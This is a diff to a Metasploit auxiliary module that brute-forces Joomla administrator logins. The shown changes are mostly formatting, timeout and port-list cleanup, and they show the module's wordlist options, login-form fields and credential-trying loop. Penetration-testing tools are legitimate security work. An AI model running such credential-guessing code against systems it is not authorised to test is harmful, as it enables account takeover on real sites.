@@ -12,17 +12,16 @@ class Metasploit3 < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::AuthBrute
-
   include Msf::Auxiliary::Scanner
 
   def initialize
     super(
       'Name'           => 'Joomla Bruteforce Login Utility',
       'Description'    => 'This module attempts to authenticate to Joomla 2.5. or 3.0 through bruteforce attacks',
-      'Author'         => [ 'luisco100[at]gmail.com' ],
+      'Author'         => 'luisco100[at]gmail.com',
       'References'     =>
         [
-          [ 'CVE', '1999-0502'] # Weak password Joomla
+          ['CVE', '1999-0502'] # Weak password Joomla
         ],
       'License'        => MSF_LICENSE
     )
@@ -35,15 +34,16 @@ class Metasploit3 < Msf::Auxiliary
           File.join(Msf::Config.data_directory, "wordlists", "http_default_users.txt") ]),
         OptPath.new('PASS_FILE',  [ false, "File containing passwords, one per line",
           File.join(Msf::Config.data_directory, "wordlists", "http_default_pass.txt") ]),
-        OptString.new('AUTH_URI', [ true, "The URI to authenticate against (default:auto)", "/administrator/index.php" ]),
-        OptString.new('FORM_URI', [ false, "The FORM URI to authenticate against (default:auto)" , "/administrator"]),
+        OptString.new('AUTH_URI', [ true, "The URI to authenticate against", "/administrator/index.php" ]),
+        OptString.new('FORM_URI', [ false, "The FORM URI to authenticate against" , "/administrator"]),
         OptString.new('USER_VARIABLE', [ false, "The name of the variable for the user field", "username"]),
         OptString.new('PASS_VARIABLE', [ false, "The name of the variable for the password field" , "passwd"]),
         OptString.new('WORD_ERROR', [ false, "The word of message for detect that login fail","mod-login-username"]),
         OptString.new('REQUEST_TYPE', [ false, "Use HTTP-GET or HTTP-PUT for Digest-Auth, PROPFIND for WebDAV (default:GET)", "POST" ]),
         OptString.new('UserAgent', [ true, 'The HTTP User-Agent sent in the request', 'Mozilla/5.0 (X11; Linux i686; rv:24.0) Gecko/20140319 Firefox/24.0 Iceweasel/24.4.0' ]),
       ], self.class)
-    register_autofilter_ports([ 80, 443, 8080, 8081, 8000, 8008, 8443, 8444, 8880, 8888 ])
+
+    register_autofilter_ports([80, 443])
   end
 
   def find_auth_uri
@@ -61,7 +61,7 @@ class Metasploit3 < Msf::Auxiliary
       res = send_request_cgi({
         'uri'     => path,
         'method'  => 'GET'
-      }, 10)
+      })
 
       next unless res
       if res.code == 301 || res.code == 302 && res.headers['Location'] && res.headers['Location'] !~ /^http/
@@ -102,7 +102,7 @@ class Metasploit3 < Msf::Auxiliary
     print_status("Attempting to login to #{target_url}")
 
     each_user_pass { |user, pass|
-        do_login(user, pass)
+      do_login(user, pass)
     }
   end
 
@@ -132,11 +132,11 @@ class Metasploit3 < Msf::Auxiliary
 
         begin
           response = send_request_cgi({
-              'uri' => @uri_mod,
-              'method' => datastore['REQUEST_TYPE'],
-              'username' => user,
-              'password' => pass
-              })
+            'uri' => @uri_mod,
+            'method' => datastore['REQUEST_TYPE'],
+            'username' => user,
+            'password' => pass
+          })
           return response
         rescue ::Rex::ConnectionError
           vprint_error("#{target_url} - Failed to connect to the web server")
@@ -184,21 +184,21 @@ class Metasploit3 < Msf::Auxiliary
                 'Content-Type'    => ctype,
                 'Referer' => referer_var,
                 'User-Agent' => datastore['UserAgent'],
-              },
+              }
           })
 
           vprint_status("#{target_url} -> First Response Code : #{response.code}")
 
           if (response.code == 301 || response.code == 302 || response.code == 303) && response.headers['Location']
 
-              path = response.headers['Location']
-              print_status("Following redirect Response: #{path}")
+            path = response.headers['Location']
+            print_status("Following redirect Response: #{path}")
 
-              response = send_request_raw({
-               'uri'     => path,
-               'method'  => 'GET',
-               'cookie' => "#{value_cookie}",
-                  }, 30)
+            response = send_request_raw({
+              'uri'     => path,
+              'method'  => 'GET',
+              'cookie' => "#{value_cookie}"
+            })
           end
 
           return response
@@ -239,15 +239,15 @@ class Metasploit3 < Msf::Auxiliary
     cval = Array.new
     valor_input_id  = ''
 
-    res = send_request_cgi({'uri' => uri,'method' => 'GET'})
+    res = send_request_cgi({'uri' => uri, 'method' => 'GET'})
 
     if(res.code == 301)
       path = res.headers['Location']
       vprint_status("Following redirect: #{path}")
       res = send_request_cgi({
-          'uri'     => path,
-          'method'  => 'GET'
-        }, 10)
+        'uri'     => path,
+        'method'  => 'GET'
+      })
     end
 
     #print_status("Response Get login cookie: #{res.to_s}")
